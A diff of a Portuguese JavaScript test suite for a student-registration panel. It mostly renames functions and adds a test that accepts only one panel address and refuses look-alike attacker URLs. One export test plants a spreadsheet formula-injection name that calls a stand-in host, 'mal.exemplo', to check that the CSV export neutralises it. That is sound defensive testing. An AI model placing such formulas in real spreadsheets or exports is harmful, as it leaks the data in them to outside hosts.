@@ -760,7 +774,7 @@ teste('o custo é 1 leitura de ponto + 1 consulta, e não cresce com o cadastro'
   semearMuitos(amb.api, 40);      // cadastro grande, que esta função não olha
   amb.zerar();
 
-  chamar(amb, 'inscritosDoProjeto', { id: 'p1' });
+  chamar(amb, 'inscritosDoProjeto_', { id: 'p1' });
 
   igual(leiturasDePonto(amb.falso).length, 1, 'a leitura de ponto é só a do projeto');
   igual(amb.falso.requisicoes.length, 2, '1 leitura de ponto + 1 consulta, e nada mais');
@@ -775,7 +789,7 @@ teste('página 1 traz o tamanho pedido, com total e páginas certos', () => {
   semearMuitos(amb.api, 25);
   amb.zerar();
 
-  const r = chamar(amb, 'listarAlunos', { pagina: 1, tamanho: 10 });
+  const r = chamar(amb, 'listarAlunos_', { pagina: 1, tamanho: 10 });
   igual(r.ok, true);
   igual(r.itens.length, 10);
   igual(r.total, 25);
@@ -786,16 +800,16 @@ teste('página 1 traz o tamanho pedido, com total e páginas certos', () => {
 teste('tamanho abaixo do piso é elevado — paginar de 1 em 1 é 2.500 páginas', () => {
   const amb = ambiente();
   semearMuitos(amb.api, 25);
-  igual(chamar(amb, 'listarAlunos', { pagina: 1, tamanho: 1 }).tamanho, 10);
-  igual(chamar(amb, 'listarAlunos', { pagina: 1, tamanho: 5000 }).tamanho, 200);
+  igual(chamar(amb, 'listarAlunos_', { pagina: 1, tamanho: 1 }).tamanho, 10);
+  igual(chamar(amb, 'listarAlunos_', { pagina: 1, tamanho: 5000 }).tamanho, 200);
 });
 
 teste('página 2 continua de onde a 1 parou, sem repetir ninguém', () => {
   const amb = ambiente();
   semearMuitos(amb.api, 25);
 
-  const p1 = chamar(amb, 'listarAlunos', { pagina: 1, tamanho: 10 }).itens.map((a) => a.id);
-  const p2 = chamar(amb, 'listarAlunos', { pagina: 2, tamanho: 10 }).itens.map((a) => a.id);
+  const p1 = chamar(amb, 'listarAlunos_', { pagina: 1, tamanho: 10 }).itens.map((a) => a.id);
+  const p2 = chamar(amb, 'listarAlunos_', { pagina: 2, tamanho: 10 }).itens.map((a) => a.id);
 
   igual(p1[0], 'm001');
   igual(p1[9], 'm010');
@@ -807,7 +821,7 @@ teste('página além do fim volta vazia, e não repete a última', () => {
   const amb = ambiente();
   semearMuitos(amb.api, 25);
 
-  const r = chamar(amb, 'listarAlunos', { pagina: 5, tamanho: 10 });
+  const r = chamar(amb, 'listarAlunos_', { pagina: 5, tamanho: 10 });
   igual(r.ok, true);
   igual(r.itens, []);
   igual(r.total, 25);
@@ -818,7 +832,7 @@ teste('além do teto de páginas, recusa sem gastar leitura', () => {
   semear(amb.api);
   amb.zerar();
 
-  const r = chamar(amb, 'listarAlunos', { pagina: 11, tamanho: 50 });
+  const r = chamar(amb, 'listarAlunos_', { pagina: 11, tamanho: 50 });
   igual(r.ok, false);
   verdadeiro(r.erro.indexOf('página 10') !== -1, r.erro);
   igual(amb.falso.requisicoes.length, 0, 'caminhar até a página 11 custaria 550 leituras');
@@ -829,7 +843,7 @@ teste('filtro por status vira fieldFilter, e o total sai da agregação', () => 
   semear(amb.api);
   amb.zerar();
 
-  const r = chamar(amb, 'listarAlunos', { status: 'DIVERGENCIA' });
+  const r = chamar(amb, 'listarAlunos_', { status: 'DIVERGENCIA' });
   igual(r.total, 1);
   igual(r.itens.length, 1);
   igual(r.itens[0].nome, 'João Souza');
@@ -845,7 +859,7 @@ teste('filtro por curso vira fieldFilter no campo curso', () => {
   semear(amb.api);
   amb.zerar();
 
-  const r = chamar(amb, 'listarAlunos', { curso: 'ADM' });
+  const r = chamar(amb, 'listarAlunos_', { curso: 'ADM' });
   igual(r.total, 2);
   igual(consultas(amb.falso)[0].corpo.structuredQuery.where.fieldFilter.field.fieldPath, 'curso');
 });
@@ -855,10 +869,10 @@ teste('NENHUMA consulta de aluno ordena por campo — nem com filtro, nem sem', 
   semear(amb.api);
   amb.zerar();
 
-  chamar(amb, 'listarAlunos', {});
-  chamar(amb, 'listarAlunos', { status: 'CONFIRMADO' });
-  chamar(amb, 'listarAlunos', { busca: 'silva' });
-  chamar(amb, 'exportarCsv', {});
+  chamar(amb, 'listarAlunos_', {});
+  chamar(amb, 'listarAlunos_', { status: 'CONFIRMADO' });
+  chamar(amb, 'listarAlunos_', { busca: 'silva' });
+  chamar(amb, 'exportarCsv_', {});
 
   consultas(amb.falso).forEach((r) => {
     const ordem = r.corpo.structuredQuery.orderBy[0];
@@ -876,7 +890,7 @@ teste('matrícula digitada vira igualdade: uma consulta, zero varredura', () => 
   semear(amb.api);
   amb.zerar();
 
-  const r = chamar(amb, 'listarAlunos', { busca: '20250003' });
+  const r = chamar(amb, 'listarAlunos_', { busca: '20250003' });
   igual(r.itens.length, 1);
   igual(r.itens[0].nome, 'Ana Pereira');
 
@@ -889,7 +903,7 @@ teste('e-mail digitado vira igualdade no campo email', () => {
   semear(amb.api);
   amb.zerar();
 
-  const r = chamar(amb, 'listarAlunos', { busca: 'joao@exemplo.com' });
+  const r = chamar(amb, 'listarAlunos_', { busca: 'joao@exemplo.com' });
   igual(r.itens.length, 1);
   igual(r.itens[0].nome, 'João Souza');
   igual(consultas(amb.falso)[0].corpo.structuredQuery.where.fieldFilter.field.fieldPath, 'email');
@@ -900,7 +914,7 @@ teste('CPF com pontuação acha — a peneira de texto não pode descartar o ach
   semear(amb.api);
   amb.zerar();
 
-  const r = chamar(amb, 'listarAlunos', { busca: '529.982.247-25' });
+  const r = chamar(amb, 'listarAlunos_', { busca: '529.982.247-25' });
   igual(r.itens.length, 1);
   igual(r.itens[0].nome, 'Maria da Silva');
   igual(consultas(amb.falso)[0].corpo.structuredQuery.where.fieldFilter.field.fieldPath, 'cpf');
@@ -911,7 +925,7 @@ teste('busca por nome varre e filtra em memória, com total exato', () => {
   semear(amb.api);
   amb.zerar();
 
-  const r = chamar(amb, 'listarAlunos', { busca: 'silva' });
+  const r = chamar(amb, 'listarAlunos_', { busca: 'silva' });
   igual(r.total, 1);
   igual(r.itens[0].nome, 'Maria da Silva');
   igual(consultas(amb.falso)[0].corpo.structuredQuery.where, undefined,
@@ -921,8 +935,8 @@ teste('busca por nome varre e filtra em memória, com total exato', () => {
 teste('busca por nome ignora acento e caixa, como o sistema em produção', () => {
   const amb = ambiente();
   semear(amb.api);
-  igual(chamar(amb, 'listarAlunos', { busca: 'JOAO' }).total, 1);
-  igual(chamar(amb, 'listarAlunos', { busca: 'joão sou' }).total, 1);
+  igual(chamar(amb, 'listarAlunos_', { busca: 'JOAO' }).total, 1);
+  igual(chamar(amb, 'listarAlunos_', { busca: 'joão sou' }).total, 1);
 });
 
 teste('matrícula pela metade não some: a igualdade falha e a varredura salva', () => {
@@ -930,7 +944,7 @@ teste('matrícula pela metade não some: a igualdade falha e a varredura salva',
   semear(amb.api);
   amb.zerar();
 
-  const r = chamar(amb, 'listarAlunos', { busca: '2025000' });
+  const r = chamar(amb, 'listarAlunos_', { busca: '2025000' });
   igual(r.total, 4, 'o prefixo aparece nas quatro matrículas');
   igual(consultas(amb.falso).length >= 2, true, 'devia tentar a igualdade antes de varrer');
 });
@@ -942,7 +956,7 @@ teste('a varredura respeita o teto e não segue lendo o cadastro inteiro', () =>
   amb.api.PAINEL_TETO_VARREDURA = 4;
   amb.zerar();
 
-  const r = chamar(amb, 'listarAlunos', { busca: 'zeta' });
+  const r = chamar(amb, 'listarAlunos_', { busca: 'zeta' });
   igual(r.total, 4, 'parou no teto — 4 documentos lidos, não 10');
   igual(consultas(amb.falso).length, 2);
 });
@@ -952,7 +966,7 @@ teste('status e curso juntos: um vai ao banco, o outro vira peneira', () => {
   semear(amb.api);
   amb.zerar();
 
-  const r = chamar(amb, 'listarAlunos', { curso: 'ADS', status: 'DIVERGENCIA' });
+  const r = chamar(amb, 'listarAlunos_', { curso: 'ADS', status: 'DIVERGENCIA' });
   igual(r.total, 1);
   igual(r.itens[0].nome, 'João Souza');
 
@@ -963,22 +977,22 @@ teste('status e curso juntos: um vai ao banco, o outro vira peneira', () => {
 teste('a lista de cursos do filtro vem do documento de agregados', () => {
   const amb = ambiente();
   semear(amb.api);
-  amb.api.inserir('agregados', { ADS: '2', ADM: '2' }, 'cursos');
+  amb.api.inserir_('agregados', { ADS: '2', ADM: '2' }, 'cursos');
 
-  igual(chamar(amb, 'listarAlunos', {}).cursos, ['ADM', 'ADS']);
+  igual(chamar(amb, 'listarAlunos_', {}).cursos, ['ADM', 'ADS']);
 });
 
 teste('sem o documento de agregados o filtro fica só com "Todos"', () => {
   const amb = ambiente();
   semear(amb.api);
-  igual(chamar(amb, 'listarAlunos', {}).cursos, []);
+  igual(chamar(amb, 'listarAlunos_', {}).cursos, []);
 });
 
 teste('o id da linha é o NOME do documento, que é o que volta em resolverAluno', () => {
   const amb = ambiente();
   criarAluno(amb.api, 'a009', { nome: 'Teste', id: 'valor-antigo-e-mentiroso' });
 
-  igual(chamar(amb, 'listarAlunos', {}).itens[0].id, 'a009');
+  igual(chamar(amb, 'listarAlunos_', {}).itens[0].id, 'a009');
 });
 
 // ------------------------------------------------------------ Detalhe
@@ -988,19 +1002,19 @@ grupo('detalheAluno — três leituras de ponto, e não três varreduras');
 teste('junta aluno, inscrição e lista oficial em 3 GET e nenhuma consulta', () => {
   const amb = ambiente();
   semear(amb.api);
-  amb.api.inserir('inscricoes', {
+  amb.api.inserir_('inscricoes', {
     criado_em: '2026-08-01 10:00:00', origem: 'SITE', projeto_nome: 'R+ Cidades',
     nome: 'Maria da Silva', email: 'maria@exemplo.com', whatsapp: '48999998888',
     matricula: '20250001', curso_fase: 'ADS11', cpf: '', data_nascimento: ''
   }, 'ins001');
-  amb.api.inserir('matriculados', {
+  amb.api.inserir_('matriculados', {
     lote_id: 'l001', importado_em: '2026-07-30 08:00:00', nome: 'Maria Silva',
     cpf: '52998224725', email: 'maria@exemplo.com', matricula: '20250001',
     curso: 'ADS', turma: 'ADS11', situacao: 'ATIVO', data_nascimento: '2004-03-02'
   }, '20250001');
   amb.zerar();
 
-  const r = chamar(amb, 'detalheAluno', { id: 'a001' });
+  const r = chamar(amb, 'detalheAluno_', { id: 'a001' });
   igual(r.ok, true);
   igual(r.aluno.nome, 'Maria da Silva');
   igual(r.inscricao.projeto, 'R+ Cidades');
@@ -1015,10 +1029,10 @@ teste('junta aluno, inscrição e lista oficial em 3 GET e nenhuma consulta', ()
 teste('sem matricula_id, o endereço é derivado da própria matrícula', () => {
   const amb = ambiente();
   criarAluno(amb.api, 'a010', { nome: 'Sem Vínculo', matricula: '2025-0007', matricula_id: '' });
-  amb.api.inserir('matriculados', { nome: 'Sem Vinculo', matricula: '20250007' }, '20250007');
+  amb.api.inserir_('matriculados', { nome: 'Sem Vinculo', matricula: '20250007' }, '20250007');
   amb.zerar();
 
-  const r = chamar(amb, 'detalheAluno', { id: 'a010' });
+  const r = chamar(amb, 'detalheAluno_', { id: 'a010' });
   igual(r.matriculado.nome, 'Sem Vinculo');
   igual(leiturasDePonto(amb.falso).length, 2, 'aluno + matriculado; não há inscrição para ler');
 });
@@ -1028,7 +1042,7 @@ teste('sem os dois vínculos, as colunas vêm nulas e nada é lido à toa', () =
   criarAluno(amb.api, 'a011', { nome: 'Solto' });
   amb.zerar();
 
-  const r = chamar(amb, 'detalheAluno', { id: 'a011' });
+  const r = chamar(amb, 'detalheAluno_', { id: 'a011' });
   igual(r.inscricao, null);
   igual(r.matriculado, null);
   igual(leiturasDePonto(amb.falso).length, 1);
@@ -1036,7 +1050,7 @@ teste('sem os dois vínculos, as colunas vêm nulas e nada é lido à toa', () =
 
 teste('aluno inexistente responde erro, e não uma tela vazia', () => {
   const amb = ambiente();
-  const r = chamar(amb, 'detalheAluno', { id: 'nao-existe' });
+  const r = chamar(amb, 'detalheAluno_', { id: 'nao-existe' });
   igual(r.ok, false);
   verdadeiro(r.erro.indexOf('não encontrado') !== -1, r.erro);
 });
@@ -1050,7 +1064,7 @@ teste('status fora dos quatro é recusado antes de qualquer leitura', () => {
   semear(amb.api);
   amb.zerar();
 
-  const r = chamar(amb, 'resolverAluno', { id: 'a001', status: 'APROVADO' });
+  const r = chamar(amb, 'resolverAluno_', { id: 'a001', status: 'APROVADO' });
   igual(r.ok, false);
   igual(r.erro, 'Status inválido.');
   igual(amb.falso.requisicoes.length, 0);
@@ -1061,7 +1075,7 @@ teste('id inexistente NÃO cria aluno fantasma — PATCH criaria', () => {
   semear(amb.api);
   const antes = amb.falso.documentos.size;
 
-  const r = chamar(amb, 'resolverAluno', { id: 'a999', status: 'CONFIRMADO' });
+  const r = chamar(amb, 'resolverAluno_', { id: 'a999', status: 'CONFIRMADO' });
   igual(r.ok, false);
   igual(amb.falso.documentos.size, antes, 'o PATCH criou um documento do nada');
 });
@@ -1070,12 +1084,12 @@ teste('grava status, observação, quem revisou e quando', () => {
   const amb = ambiente();
   semear(amb.api);
 
-  const r = chamar(amb, 'resolverAluno', {
+  const r = chamar(amb, 'resolverAluno_', {
     id: 'a002', status: 'CONFIRMADO', observacoes: '  conferido na secretaria  '
   });
   igual(r.ok, true);
 
-  const aluno = amb.api.ler('alunos', 'a002');
+  const aluno = amb.api.ler_('alunos', 'a002');
   igual(aluno.status, 'CONFIRMADO');
   igual(aluno.observacoes, 'conferido na secretaria');
   igual(aluno.revisado_por, 'coordenacao@exemplo.com');
@@ -1086,9 +1100,9 @@ teste('grava status, observação, quem revisou e quando', () => {
 teste('a decisão vai para a trilha de auditoria, com o de-para', () => {
   const amb = ambiente();
   semear(amb.api);
-  chamar(amb, 'resolverAluno', { id: 'a002', status: 'CONFIRMADO' });
+  chamar(amb, 'resolverAluno_', { id: 'a002', status: 'CONFIRMADO' });
 
-  const log = amb.api.ultimosRegistros(10);
+  const log = amb.api.ultimosRegistros_(10);
   igual(log[0].acao, 'REVISAO');
   igual(log[0].entidade_id, 'a002');
   igual(log[0].detalhe, 'DIVERGENCIA -> CONFIRMADO');
@@ -1097,10 +1111,10 @@ teste('a decisão vai para a trilha de auditoria, com o de-para', () => {
 teste('observação gigante é cortada no teto', () => {
   const amb = ambiente();
   semear(amb.api);
-  chamar(amb, 'resolverAluno', {
+  chamar(amb, 'resolverAluno_', {
     id: 'a002', status: 'CONFIRMADO', observacoes: 'x'.repeat(5000)
   });
-  igual(amb.api.ler('alunos', 'a002').observacoes.length, 2000);
+  igual(amb.api.ler_('alunos', 'a002').observacoes.length, 2000);
 });
 
 // ------------------------------------------------------------ Exportação
@@ -1111,7 +1125,7 @@ teste('cabeçalho, BOM e ponto e vírgula — o CSV que o Excel pt-BR abre', () 
   const amb = ambiente();
   semear(amb.api);
 
-  const r = chamar(amb, 'exportarCsv', {});
+  const r = chamar(amb, 'exportarCsv_', {});
   igual(r.ok, true);
   igual(r.linhas, 4);
   igual(r.csv.charCodeAt(0), 0xFEFF, 'sem BOM o Excel embaralha os acentos');
@@ -1124,7 +1138,7 @@ teste('cabeçalho, BOM e ponto e vírgula — o CSV que o Excel pt-BR abre', () 
 teste('a coluna Status sai com o rótulo humano, não com a constante', () => {
   const amb = ambiente();
   semear(amb.api);
-  const linhas = chamar(amb, 'exportarCsv', {}).csv.split('\r\n');
+  const linhas = chamar(amb, 'exportarCsv_', {}).csv.split('\r\n');
   verdadeiro(linhas.join('\n').indexOf('"Só matriculado"') !== -1, 'faltou o rótulo do status');
 });
 
@@ -1132,7 +1146,7 @@ teste('=1+1 no nome não vira fórmula ao abrir a planilha', () => {
   const amb = ambiente();
   criarAluno(amb.api, 'a020', { nome: '=IMPORTXML("http://mal.exemplo"&A1)' });
 
-  const csv = chamar(amb, 'exportarCsv', {}).csv;
+  const csv = chamar(amb, 'exportarCsv_', {}).csv;
   verdadeiro(csv.indexOf('"\'=IMPORTXML') !== -1, 'a aspa simples é o que impede a avaliação');
 });
 
@@ -1140,16 +1154,16 @@ teste('aspas dentro do texto são escapadas, e a linha não quebra', () => {
   const amb = ambiente();
   criarAluno(amb.api, 'a021', { nome: 'Maria "Duda" Silva' });
 
-  const csv = chamar(amb, 'exportarCsv', {}).csv;
+  const csv = chamar(amb, 'exportarCsv_', {}).csv;
   verdadeiro(csv.indexOf('"Maria ""Duda"" Silva"') !== -1, csv);
 });
 
 teste('a exportação respeita o filtro da tela', () => {
   const amb = ambiente();
   semear(amb.api);
-  igual(chamar(amb, 'exportarCsv', { status: 'CONFIRMADO' }).linhas, 1);
-  igual(chamar(amb, 'exportarCsv', { curso: 'ADM' }).linhas, 2);
-  igual(chamar(amb, 'exportarCsv', { busca: 'pereira' }).linhas, 1);
+  igual(chamar(amb, 'exportarCsv_', { status: 'CONFIRMADO' }).linhas, 1);
+  igual(chamar(amb, 'exportarCsv_', { curso: 'ADM' }).linhas, 2);
+  igual(chamar(amb, 'exportarCsv_', { busca: 'pereira' }).linhas, 1);
 });
 
 teste('exportar entrega o MESMO conjunto que a tela mostrou', () => {
@@ -1161,8 +1175,8 @@ teste('exportar entrega o MESMO conjunto que a tela mostrou', () => {
 
   [{ busca: '529.982.247-25' }, { busca: '20250003' }, { busca: 'joao@exemplo.com' },
     { busca: 'silva' }, { curso: 'ADS', status: 'DIVERGENCIA' }].forEach((filtros) => {
-    igual(chamar(amb, 'exportarCsv', filtros).linhas,
-      chamar(amb, 'listarAlunos', filtros).total,
+    igual(chamar(amb, 'exportarCsv_', filtros).linhas,
+      chamar(amb, 'listarAlunos_', filtros).total,
       'divergiu em ' + JSON.stringify(filtros));
   });
 });
@@ -1170,9 +1184,9 @@ teste('exportar entrega o MESMO conjunto que a tela mostrou', () => {
 teste('exportar deixa rastro no log, com o tamanho do arquivo', () => {
   const amb = ambiente();
   semear(amb.api);
-  chamar(amb, 'exportarCsv', {});
+  chamar(amb, 'exportarCsv_', {});
 
-  const log = amb.api.ultimosRegistros(5);
+  const log = amb.api.ultimosRegistros_(5);
   igual(log[0].acao, 'EXPORTACAO');
   igual(log[0].detalhe, '4 linhas');
 });
@@ -1183,7 +1197,7 @@ teste('e a trilha diz QUAL pessoa exportou — a pergunta que a coluna existe pa
   // acesso cheia, é A pergunta — e a coluna respondia 'anonimo', porque o web
   // app publicado roda como a conta que implantou (04_Log.gs).
   //
-  // Mutação que derruba: `registrar` voltar a gravar `usuarioAtual()`. Aqui as
+  // Mutação que derruba: `registrar_` voltar a gravar `usuarioAtual_()`. Aqui as
   // duas identidades DIVERGEM de propósito — a do Apps Script é
   // coordenacao@exemplo.com e a da SESSÃO é a professora —, então errar a fonte
   // troca o nome em vez de acertar por coincidência.
@@ -1191,10 +1205,10 @@ teste('e a trilha diz QUAL pessoa exportou — a pergunta que a coluna existe pa
   semear(amb.api);
   const dela = amb.api.criarSessao_('professora@exemplo.com');
 
-  igual(amb.api.exportarCsv({ token: dela }).ok, true);
+  igual(amb.api.exportarCsv_({ token: dela }).ok, true);
 
-  igual(amb.api.usuarioAtual(), 'coordenacao@exemplo.com', 'as identidades tinham de divergir');
-  const log = amb.api.ultimosRegistros(5);
+  igual(amb.api.usuarioAtual_(), 'coordenacao@exemplo.com', 'as identidades tinham de divergir');
+  const log = amb.api.ultimosRegistros_(5);
   igual(log[0].acao, 'EXPORTACAO');
   igual(log[0].usuario, 'professora@exemplo.com', 'a trilha não diz quem baixou o cadastro');
 });
@@ -1205,8 +1219,8 @@ teste('acima do teto o arquivo sai truncado e o log DIZ que saiu', () => {
   amb.api.PAINEL_BLOCO = 2;
   amb.api.PAINEL_TETO_EXPORTACAO = 4;
 
-  igual(chamar(amb, 'exportarCsv', {}).linhas, 4);
-  verdadeiro(amb.api.ultimosRegistros(5)[0].detalhe.indexOf('TRUNCADO') !== -1,
+  igual(chamar(amb, 'exportarCsv_', {}).linhas, 4);
+  verdadeiro(amb.api.ultimosRegistros_(5)[0].detalhe.indexOf('TRUNCADO') !== -1,
     'truncar em silêncio entregaria um cadastro incompleto como se fosse completo');
 });
 
@@ -1216,17 +1230,17 @@ grupo('listarLotes e listarLog — ordenar por CAMPO, nunca por __name__ DESC');
 
 teste('lotes ordena por criado_em DESC, com limite', () => {
   const amb = ambiente();
-  amb.api.inserir('lotes', {
+  amb.api.inserir_('lotes', {
     arquivo: 'a.csv', criado_em: '20260701T090000000Z',
     importado_em: '2026-07-01 09:00:00', linhas: '10'
   }, 'l1');
-  amb.api.inserir('lotes', {
+  amb.api.inserir_('lotes', {
     arquivo: 'b.csv', criado_em: '20260801T090000000Z',
     importado_em: '2026-08-01 09:00:00', linhas: '20'
   }, 'l2');
   amb.zerar();
 
-  const r = chamar(amb, 'listarLotes');
+  const r = chamar(amb, 'listarLotes_');
   igual(r.itens.map((l) => l.arquivo), ['b.csv', 'a.csv']);
 
   const c = consultas(amb.falso)[0].corpo.structuredQuery;
@@ -1237,10 +1251,10 @@ teste('lotes ordena por criado_em DESC, com limite', () => {
 
 teste('log ordena por criado_em DESC, com limite de 100', () => {
   const amb = ambiente();
-  amb.api.registrar('TESTE', 'x', '1', 'primeiro');
+  amb.api.registrar_('TESTE', 'x', '1', 'primeiro');
   amb.zerar();
 
-  const r = chamar(amb, 'listarLog');
+  const r = chamar(amb, 'listarLog_');
   igual(r.itens[0].acao, 'TESTE');
   igual(r.itens[0].usuario, 'coordenacao@exemplo.com');
 
@@ -1252,25 +1266,25 @@ teste('log ordena por criado_em DESC, com limite de 100', () => {
 
 teste('detalhe muito longo no log é resumido na tela', () => {
   const amb = ambiente();
-  amb.api.registrar('TESTE', 'x', '1', 'y'.repeat(500));
-  igual(chamar(amb, 'listarLog').itens[0].detalhe.length, 200);
+  amb.api.registrar_('TESTE', 'x', '1', 'y'.repeat(500));
+  igual(chamar(amb, 'listarLog_').itens[0].detalhe.length, 200);
 });
 
 teste('lotes com o carimbo sob outro nome não some da tela (rede de segurança)', () => {
   // O falso de apoio.js ORDENA documentos sem o campo pedido (usa '' como
   // chave); o Firestore de verdade os EXCLUI do resultado. Como é justamente
-  // esse comportamento que a rede de segurança existe para cobrir, aqui `listar`
+  // esse comportamento que a rede de segurança existe para cobrir, aqui `listar_`
   // é trocado por um espião que reproduz a exclusão. ISTO PROVA A LÓGICA DA REDE,
   // NÃO O COMPORTAMENTO DO BANCO — só o Firestore real prova o segundo.
   const amb = ambiente();
   const pedidos = [];
-  amb.api.listar = (colecao, opcoes) => {
+  amb.api.listar_ = (colecao, opcoes) => {
     pedidos.push(opcoes);
     if (opcoes.ordenarPor) return { itens: [], cursor: null };
     return { itens: [{ _id: 'l9', arquivo: 'sem-carimbo.csv' }], cursor: null };
   };
 
-  const r = chamar(amb, 'listarLotes');
+  const r = chamar(amb, 'listarLotes_');
   igual(r.itens.length, 1);
   igual(r.itens[0].arquivo, 'sem-carimbo.csv');
   igual(r.itens[0].lote_id, 'l9', 'sem campo lote_id, o id do documento serve');
@@ -1279,7 +1293,7 @@ teste('lotes com o carimbo sob outro nome não some da tela (rede de segurança)
 
 teste('sem nenhum lote, a aba responde lista vazia e não erro', () => {
   const amb = ambiente();
-  const r = chamar(amb, 'listarLotes');
+  const r = chamar(amb, 'listarLotes_');
   igual(r.ok, true);
   igual(r.itens, []);
 });
@@ -1290,9 +1304,9 @@ grupo('lerConfiguracoes — segredo não sai daqui');
 
 teste('lista as chaves de CONFIG_PADRAO com valor e descrição', () => {
   const amb = ambiente();
-  amb.api.gravarConfig('vagas_padrao', '45');
+  amb.api.gravarConfig_('vagas_padrao', '45');
 
-  const r = chamar(amb, 'lerConfiguracoes');
+  const r = chamar(amb, 'lerConfiguracoes_');
   igual(r.ok, true);
 
   const mapa = {};
@@ -1312,16 +1326,16 @@ teste('chave marcada como segredo não chega à tela — nem o campo, nem o valo
   // deploy que o criasse, porque a tela imprime todo valor em `value="..."`.
   const amb = ambiente();
   amb.api.CONFIG_SEGREDOS.form_id = 'FORM_ID_SECRETO';
-  amb.api.gravarConfig('form_id', 'segredo-de-verdade');
+  amb.api.gravarConfig_('form_id', 'segredo-de-verdade');
 
-  const resposta = chamar(amb, 'lerConfiguracoes');
+  const resposta = chamar(amb, 'lerConfiguracoes_');
   igual(resposta.itens.filter((i) => i.chave === 'form_id'), []);
   igual(JSON.stringify(resposta).indexOf('segredo-de-verdade'), -1, 'o segredo vazou na resposta');
 });
 
 teste('e hoje não há nenhuma: a tela mostra CONFIG_PADRAO inteiro', () => {
   const amb = ambiente();
-  const chaves = chamar(amb, 'lerConfiguracoes').itens.map((i) => i.chave);
+  const chaves = chamar(amb, 'lerConfiguracoes_').itens.map((i) => i.chave);
 
   amb.api.CONFIG_PADRAO.forEach((padrao) => {
     verdadeiro(chaves.indexOf(padrao.chave) !== -1, padrao.chave + ' sumiu da aba Configurações');
@@ -1330,24 +1344,24 @@ teste('e hoje não há nenhuma: a tela mostra CONFIG_PADRAO inteiro', () => {
 
 teste('chave criada à mão no banco não fica invisível', () => {
   const amb = ambiente();
-  amb.api.atualizar('config', 'geral', { chave_estranha: 'valor' });
-  amb.api.limparCacheConfig();
+  amb.api.atualizar_('config', 'geral', { chave_estranha: 'valor' });
+  amb.api.limparCacheConfig_();
 
-  const achada = chamar(amb, 'lerConfiguracoes').itens
+  const achada = chamar(amb, 'lerConfiguracoes_').itens
     .filter((i) => i.chave === 'chave_estranha')[0];
   igual(achada.valor, 'valor');
 });
 
 teste('fora de uma implantação publicada, urlWebApp vem vazia', () => {
   const amb = ambiente();
-  igual(chamar(amb, 'lerConfiguracoes').urlWebApp, '');
+  igual(chamar(amb, 'lerConfiguracoes_').urlWebApp, '');
 });
 
 teste('publicado, urlWebApp devolve o endereço do web app', () => {
   const amb = ambiente();
   amb.api.ScriptApp.getService = () => ({ getUrl: () => 'https://script.google.com/macros/s/AAA/exec' });
 
-  igual(chamar(amb, 'lerConfiguracoes').urlWebApp,
+  igual(chamar(amb, 'lerConfiguracoes_').urlWebApp,
     'https://script.google.com/macros/s/AAA/exec');
 });
 
@@ -1355,13 +1369,13 @@ grupo('salvarConfiguracao — as guardas contra trancar o painel por fora');
 
 teste('grava e registra a chave, nunca o valor', () => {
   const amb = ambiente();
-  const r = chamar(amb, 'salvarConfiguracao', { chave: 'texto_esgotado', valor: 'Acabou.' });
+  const r = chamar(amb, 'salvarConfiguracao_', { chave: 'texto_esgotado', valor: 'Acabou.' });
   igual(r.ok, true);
 
-  amb.api.limparCacheConfig();
-  igual(amb.api.config('texto_esgotado'), 'Acabou.');
+  amb.api.limparCacheConfig_();
+  igual(amb.api.config_('texto_esgotado'), 'Acabou.');
 
-  const log = amb.api.ultimosRegistros(5)[0];
+  const log = amb.api.ultimosRegistros_(5)[0];
   igual(log.acao, 'CONFIG');
   igual(log.entidade_id, 'texto_esgotado');
   igual(log.detalhe.indexOf('Acabou.'), -1, 'o valor não pode ir para a trilha');
@@ -1369,7 +1383,7 @@ teste('grava e registra a chave, nunca o valor', () => {
 
 teste('chave desconhecida é recusada — sem ela, o erro de digitação é mudo', () => {
   const amb = ambiente();
-  const r = chamar(amb, 'salvarConfiguracao', { chave: 'vagas_padrao_', valor: '10' });
+  const r = chamar(amb, 'salvarConfiguracao_', { chave: 'vagas_padrao_', valor: '10' });
   igual(r.ok, false);
   verdadeiro(r.erro.indexOf('desconhecida') !== -1, r.erro);
 });
@@ -1380,27 +1394,55 @@ teste('modo_acesso_painel não existe mais, e a tela recusa a chave morta', () =
   // fica porque uma chave que reaparecer no banco volta a ser editável pela tela,
   // e uma configuração que ninguém lê promete o que não cumpre.
   const amb = ambiente();
-  const r = chamar(amb, 'salvarConfiguracao', { chave: 'modo_acesso_painel', valor: 'GOOGLE' });
+  const r = chamar(amb, 'salvarConfiguracao_', { chave: 'modo_acesso_painel', valor: 'GOOGLE' });
 
   igual(r.ok, false);
   verdadeiro(r.erro.indexOf('desconhecida') !== -1, r.erro);
   igual(amb.api.CONFIG_PADRAO.filter((c) => c.chave === 'modo_acesso_painel'), []);
 });
 
+teste('url_painel só aceita um dos endereços do código — ou vazio, que é o padrão', () => {
+  // É para esse endereço que vai o código de entrada do link por e-mail: um
+  // endereço digitado aqui seria o lugar para onde o código vai. A recusa não
+  // grava nem deixa linha de CONFIG na trilha; a forma sem a barra do fim é o
+  // mesmo endereço, e vazio devolve o padrão.
+  //
+  // Mutação que derruba: tirar a guarda de `url_painel` de `salvarConfiguracao_`,
+  // ou trocar `painelAceito_` por uma comparação de prefixo.
+  const amb = ambiente();
+  const antes = amb.api.config_('url_painel');
+
+  ['https://outro-host.exemplo/painel/', 'https://cesutech.github.io.outro-host.exemplo/painel/',
+    'http://cesutech.github.io/painel/', 'https://cesutech.github.io/painel/outra-coisa/'].forEach((falso) => {
+    const r = chamar(amb, 'salvarConfiguracao_', { chave: 'url_painel', valor: falso });
+    igual(r.ok, false, 'aceitou ' + falso);
+    verdadeiro(r.erro.indexOf('https://cesutech.github.io/painel/') !== -1, r.erro);
+    amb.api.limparCacheConfig_();
+    igual(amb.api.config_('url_painel'), antes, 'a recusa gravou assim mesmo: ' + falso);
+  });
+  igual(amb.api.ultimosRegistros_(20).filter((l) => l.acao === 'CONFIG').length, 0,
+    'a recusa deixou linha de configuração alterada');
+
+  igual(chamar(amb, 'salvarConfiguracao_', { chave: 'url_painel', valor: 'https://cesutech.github.io/painel' }).ok, true);
+  igual(chamar(amb, 'salvarConfiguracao_', { chave: 'url_painel', valor: '' }).ok, true);
+  amb.api.limparCacheConfig_();
+  igual(amb.api.urlDoPainel_(), 'https://cesutech.github.io/painel/');
+});
+
 grupo('salvarConfiguracao — a allowlist não passa por aqui como texto');
 
 teste('admin_emails vai para regravarAllowlist_: apagar a si mesmo é recusado', () => {
   // `admin_emails` é a lista de quem entra, e não um texto: gravá-la por aqui era
-  // a porta dos fundos das guardas de `removerAdmin`.
+  // a porta dos fundos das guardas de `removerAdmin_`.
   const amb = ambiente();
